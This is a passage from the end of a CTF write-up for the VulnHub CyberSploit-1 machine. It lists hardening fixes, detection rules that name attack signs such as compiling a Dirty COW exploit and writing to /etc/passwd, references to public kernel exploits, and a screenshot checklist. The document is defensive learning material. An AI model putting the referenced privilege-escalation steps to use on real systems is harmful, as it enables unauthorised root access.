   PasswordAuthentication no
   PermitRootLogin no
   MaxAuthTries 3
   LoginGraceTime 20
   ```
7. **Set home-directory files to `600`.** `flag2.txt` was `664`. A default `umask 077`
   for sensitive accounts, plus a nightly sweep:
   ```bash
   find /home -xdev -type f -perm /o+r \( -iname '*cred*' -o -iname '*pass*' \
>        -o -iname '*flag*' -o -iname '*.pem' -o -iname 'id_*' \) -print
   ```
8. **Strip banners and add security headers:**
   ```apache
   ServerTokens Prod
   ServerSignature Off
   Header unset X-Powered-By
   Header always set X-Frame-Options "DENY"
   Header always set X-Content-Type-Options "nosniff"
   Header always set Content-Security-Policy "default-src 'self'"
   FileETag None
   ```
9. **Retire weak SSH host keys.** Remove 1024-bit DSA:
   ```bash
   rm -f /etc/ssh/ssh_host_dsa_key*
   # /etc/ssh/sshd_config
   HostKey /etc/ssh/ssh_host_ed25519_key
   HostKey /etc/ssh/ssh_host_rsa_key
   ```
10. **Detection opportunities.**
    - Alert on any HTTP response body from a *static* file containing a base64-looking
      token ≥ 20 characters in a comment. That pattern is almost never legitimate.
    - Alert on requests to `/robots.txt` followed by SSH login attempts from the same
      source IP — that sequence is this exact attack.
    - SSH: many failed logins then a success → `fail2ban` + SIEM correlation.
    - auditd on the overlayfs/Dirty-COW signatures:
      ```bash
      auditctl -w /etc/ld.so.preload -p wa -k ldpreload
      auditctl -w /etc/passwd -p wa -k passwd_change
      auditctl -a always,exit -F arch=b32 -S execve -F uid=1000 -k user_exec
      ```
    - Alert on `gcc`/`cc1`/`g++` execution by a non-developer account, and on `wget`
      fetching a `.c`/`.cpp` file.
    - `dmesg`/`kern.log` alerts on `BUG:`, `general protection fault`, or Dirty-COW's
      characteristic `/etc/passwd` write.

---

## 10. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/cybersploit-1,506/>
- Series: <https://vulnhub.com/series/cybersploit,340/>
- Author: CyberSploit — <https://www.youtube.com/c/cybersploit>
- Community writeups consulted:
  - [adevanandh — Vulnhub: Cybersploit-1 Detailed Walkthrough](https://medium.com/@adevanandh/vulnhub-cybersploit-1-detailed-walkthrough-8fc9a4e7506a)
  - [Arun Subramanian — Cybersploit:1 vulnhub walkthrough](https://medium.com/@arunsubramanian17/cybersploit-1-vulnhub-walkthrough-1b96f8f4d8fc)
  - [pritamdas202000 — VulnHub cybersploit 1 Walkthrough](https://medium.com/@pritamdas202000/vulnhub-cybersploit-1-walkthrough-ae94cd36a63a)
  - [assume-breach — Vulnhub CyberSploit 1 Walkthrough OSCP Prep](https://assume-breach.medium.com/vulnhub-cybersploit-1-walkthrough-oscp-prep-e706d9e1f0e8)
  - [muhammedsalih886 — Cybersploit-1 Walkthrough](https://medium.com/@muhammedsalih886/cybersploit-1-walkthrough-fc8e7ac661c7)
- Exploits / advisories:
  - [CVE-2015-1328 — Ubuntu overlayfs local privilege escalation](https://nvd.nist.gov/vuln/detail/CVE-2015-1328) · [Exploit-DB 37292](https://www.exploit-db.com/exploits/37292) · [Launchpad bug 1507645](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1507645) · [Ubuntu USN-2641-1](https://ubuntu.com/security/notices/USN-2641-1)
  - [CVE-2016-5195 — Dirty COW](https://dirtycow.ninja) · [Exploit-DB 40847 (x86 C++)](https://www.exploit-db.com/exploits/40847) · [Exploit-DB 40839 (x64)](https://www.exploit-db.com/exploits/40839)
- Tools / background:
  - [Exploit-DB](https://www.exploit-db.com/) and [`searchsploit` usage](https://gitlab.com/exploit-database/exploitdb#searchsploit)
  - [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
  - [RFC 4648 — The Base16, Base32 and Base64 Data Encodings](https://datatracker.ietf.org/doc/html/rfc4648)
  - [CyberChef](https://gchq.github.io/CyberChef/) · [dencode.com](https://dencode.com/) · [cryptii binary decoder](https://cryptii.com/pipes/binary-decoder)
  - [OverlayFS kernel documentation](https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt)
  - [`gcc(1)` options](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html) · [`base64(1)`](https://man7.org/linux/man-pages/man1/base64.1.html) · [`xxd(1)`](https://linux.die.net/man/1/xxd)
  - [GTFOBins](https://gtfobins.github.io) · [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

---

## 11. Screenshot checklist

- [ ] `images/01-recon.png` — `netdiscover` / `nmap -sn` finding the target
- [ ] `images/02-nmap.png` — ports 22 and 80 with the Ubuntu 14.04 banner
- [ ] `images/03-flag1.png` — `robots.txt` and the base64-decoded flag 1
- [ ] `images/04-ssh.png` — SSH as `itsskv`, showing kernel `3.13.0-32-generic`
- [ ] `images/05-flag2.png` — `flag2.txt` binary decoded
- [ ] `images/06-root.png` — `searchsploit` match, `gcc`, and `uid=0(root)`
- [ ] `images/07-finalflag.png` — `/root/finalflag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
